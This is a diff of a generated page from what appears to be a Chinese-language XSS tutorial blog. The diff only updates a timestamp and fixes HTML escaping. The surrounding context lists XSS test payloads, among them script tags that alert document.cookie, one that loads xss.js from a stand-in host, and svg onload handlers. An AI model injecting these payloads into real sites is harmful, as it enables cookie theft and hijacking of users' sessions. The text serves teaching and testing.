@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2024-01-16_17-03-08.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2024-01-16_17-03-53.png">
 <meta property="article:published_time" content="2024-01-16T11:44:02.000Z">
-<meta property="article:modified_time" content="2024-01-16T11:50:06.586Z">
+<meta property="article:modified_time" content="2024-01-16T11:58:14.919Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary_large_image">
@@ -591,7 +591,7 @@
 <h3 id="检测xss漏洞"><a href="#检测xss漏洞" class="headerlink" title="检测xss漏洞"></a>检测xss漏洞</h3><p>检测反射型xss只需要在浏览器中执行弹窗语句alert（）就有xss漏洞。</p>
 <p>在有数据交互的地方输入js语句查看是否会执行。</p>
 <h3 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h3><p>以下所有标签的 &gt; 都可以用 &#x2F;&#x2F; 代替， 例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p>
-<p><code>&lt;script&gt;</code>标签：&#96;&#96;<script>`标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p>
+<p><code>&lt;script&gt;</code>标签：<code>&lt;script&gt;</code>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg&gt;标签:<br><br>&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br>&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>//<br></code></pre></td></tr></table></figure>
